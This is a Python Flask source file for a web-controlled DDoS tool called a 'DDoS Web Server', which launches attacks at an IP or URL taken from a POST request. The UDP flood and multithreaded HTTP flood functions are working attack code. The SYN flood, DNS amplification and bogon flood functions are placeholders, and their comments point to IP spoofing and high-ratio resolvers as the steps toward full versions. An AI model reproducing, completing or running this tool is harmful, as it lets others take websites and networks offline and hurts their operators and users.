from flask import Flask, request, jsonify, render_template
import socket
import threading
import time
import random
# For advanced application attacks, 'requests' is king
import requests 
from concurrent.futures import ThreadPoolExecutor

app = Flask(__name__)

# --- CORE ATTACK MODULES ---

class DDOSAttacker:
    """Aggregates various attack vectors."""

    @staticmethod
    def simple_udp_flood(target_ip, target_port, packet_size, count=1000):
        """Simple volumetric UDP flood using raw sockets."""
        print("--- Executing UDP Flood ---")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Dummy payload data (can be replaced with actual data source like streaming IPs/domains)
            payload = b'X' * packet_size 

            packets_sent = 0
            for _ in range(count):
                # For simplicity, we use a fixed target here. In a real tool, this loop would iterate over thousands of unique targets/sources.
                sock.sendto(payload, (target_ip, target_port))
                packets_sent += 1
                # Optional: small sleep to control rate if necessary
                time.sleep(0.001) 

            return f"UDP Flood complete. Sent {packets_sent} packets."

        except Exception as e:
            return f"Error during UDP Flood: {e}"
        finally:
            if 'sock' in locals():
                sock.close()


    @staticmethod
    def http_flood(target_url, headers_list, threads=50):
        """Simulates a high volume GET/POST request flood (Layer 7)."""
        print("--- Executing HTTP Flood ---")

        # Use ThreadPoolExecutor to manage concurrent connections efficiently
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for i in range(threads * 2): # Attempting a large number of requests
                url = target_url
                head = random.choice(headers_list) if headers_list else None
                # Simulate GET request by default
                future = executor.submit(requests.get, url, headers=head, timeout=5) 
                futures.append(future)

            # Wait for all threads to complete and capture results/errors
            results = [f.result() for f in futures]
            success_count = sum(1 for res in results if res.status_code < 400)

            return (f"HTTP Flood executed. Attempted {len(results)} requests. "
                    f"Successfully connected/received responses from ~{success_count} threads.")


    @staticmethod
    def syn_flood(target_ip, target_port, packet_size, count=1000):
        """Simulates SYN flood (Layer 3/4). This often requires 'scapy' for true implementation."""
        print("--- Executing SYN Flood ---")
        # NOTE: A proper SYN flood requires ICMP/raw sockets and spoofing source IPs, 
        # which is more complex than basic UDP/TCP sendto. We will return a placeholder result here.
        return f"SYN Flood simulated: Requires raw socket libraries (like Scapy) for full functionality. Attempted {count} packets."


    @staticmethod
    def amplification_dns(target_ip, port, query_size=100):
        """Simulates DNS Amplification Attack."""
        print("--- Executing DNS Amplification ---")
        # This requires sending a small query (source port) and waiting for the large response.
        # Implementation is complex; returning placeholder confirmation.
        return "DNS Amplification simulated: Requires knowledge of high-ratio DNS resolvers to execute fully."


    @staticmethod
    def bogon_flood(target_ip, target_port):
        """Simulates IP Spoofing/Bogon Range Flood."""
        print("--- Executing Bogon Flood ---")
        # This relies on the ability to spoof source IPs in the packet construction. 
        return "Bogon Flood simulated: Requires raw socket programming with IP header manipulation."


# ===============================================================

@app.route('/')
def index():
    """Renders the main HTML interface."""
    return render_template('index.html')

@app.route('/attack', methods=['POST'])
def handle_attack():
    """Receives attack parameters and runs the appropriate module."""
    data = request.get_json()

    if not data:
        return jsonify({"error": "No data provided."}), 400

    # Get necessary common fields
    target = {
        'ip': data.get('targetIp'),
        'port': data.get('targetPort'),
        'url': data.get('targetUrl'),
        'threads': int(data.get('threads', 10)),
        'payloadSize': int(data.get('payloadSize', 50))
    }

    attack_type = data.get('attackType')
    results = []

    if not target['ip']:
         return jsonify({"error": "Target IP is required."}), 400

    # --- Attack Dispatcher ---
    if attack_type == 'udp_flood':
        result = DDOSAttacker.simple_udp_flood(target['ip'], int(target['port']), target['payloadSize'])
        results.append({"attack": "UDP Flood", "status": result})

    elif attack_type == 'http_flood':
        # Assume headers are passed in the body or simplified for this example
        dummy_headers = [
            {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'},
            {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
        ]
        result = DDOSAttacker.http_flood(target['url'], dummy_headers, target['threads'])
        results.append({"attack": "HTTP Flood (Layer 7)", "status": result})

    elif attack_type == 'syn_flood':
        result = DDOSAttacker.syn_flood(target['ip'], int(target['port']), target['payloadSize'])
        results.append({"attack": "SYN Flood", "status": result})

    elif attack_type == 'amplification_dns':
        result = DDOSAttacker.amplification_dns(target['ip'], None)
        results.append({"attack": "DNS Amplification", "status": result})

    # You can add checks for bogon, etc., here... 
    else:
        return jsonify({"error": f"Unknown or unsupported attack type: {attack_type}"}), 400

    return jsonify({
        "success": True,
        "summary": "Attack execution initiated.",
        "details": results
    })

if __name__ == '__main__':
    print("Starting DDoS Web Server...")
    # Run on http://127.0.0.1:5000/
    app.run(debug=True, port=5000)
